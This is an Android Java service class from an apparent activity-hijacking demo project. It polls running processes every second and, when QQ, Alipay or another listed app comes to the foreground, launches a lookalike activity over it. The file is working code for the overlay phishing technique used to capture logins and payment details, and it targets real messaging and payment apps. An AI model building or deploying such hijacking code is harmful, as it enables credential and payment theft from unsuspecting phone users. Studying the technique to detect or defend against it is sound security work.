package com.xpf.android.hijackactivity.service;

import android.app.ActivityManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;

import com.xpf.android.hijackactivity.HijackingApplication;
import com.xpf.android.hijackactivity.activity.AlipayStoryActivity;
import com.xpf.android.hijackactivity.activity.JokeActivity;
import com.xpf.android.hijackactivity.activity.QQStoryActivity;

import java.util.HashMap;
import java.util.List;

/**
 * Created by x-sir on 2019-11-22 :)
 * Function:
 */
public class HijackingService extends Service {

    private static final String TAG = "HijackingService";
    private boolean hasStart = false;
    HashMap<String, Class<?>> mSadStories = new HashMap<>();

    Handler handler = new Handler();

    Runnable mTask = new Runnable() {

        @Override
        public void run() {
            ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
            List<ActivityManager.RunningAppProcessInfo> appProcessInfos = activityManager.getRunningAppProcesses();
            // 枚举进程
            Log.w(TAG, "正在枚举进程");
            for (ActivityManager.RunningAppProcessInfo appProcessInfo : appProcessInfos) {
                // 如果APP在前台，那么——悲伤的故事就要来了
                if (appProcessInfo.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {
                    if (mSadStories.containsKey(appProcessInfo.processName)) {
                        // 进行劫持
                        hijacking(appProcessInfo.processName);
                    } else {
                        Log.w(TAG, appProcessInfo.processName);
                    }
                }
            }
            handler.postDelayed(mTask, 1000);
        }

        /**
         * 进行劫持
         * @param processName
         */
        private void hijacking(String processName) {
            Log.w(TAG, "有程序要悲剧了……");
            if (!HijackingApplication.hasProgressBeHijacked(processName)) {
                Log.w(TAG, "悲剧正在发生");
                Intent jackingIsComing = new Intent(getBaseContext(), mSadStories.get(processName));
                jackingIsComing.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                getApplication().startActivity(jackingIsComing);
                HijackingApplication.addProgressHijacked(processName);
                Log.w(TAG, "已经劫持");
            }
        }
    };

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
        if (!hasStart) {
            mSadStories.put("com.sinaapp.msdxblog.android.lol", JokeActivity.class);
            mSadStories.put("com.tencent.mobileqq", QQStoryActivity.class);
            mSadStories.put("com.eg.android.AlipayGphone", AlipayStoryActivity.class);
            handler.postDelayed(mTask, 1000);
            hasStart = true;
        }
    }

    @Override
    public boolean stopService(Intent name) {
        hasStart = false;
        Log.w(TAG, "劫持服务停止");
        HijackingApplication.clearProgressHijacked();
        return super.stopService(name);
    }
}
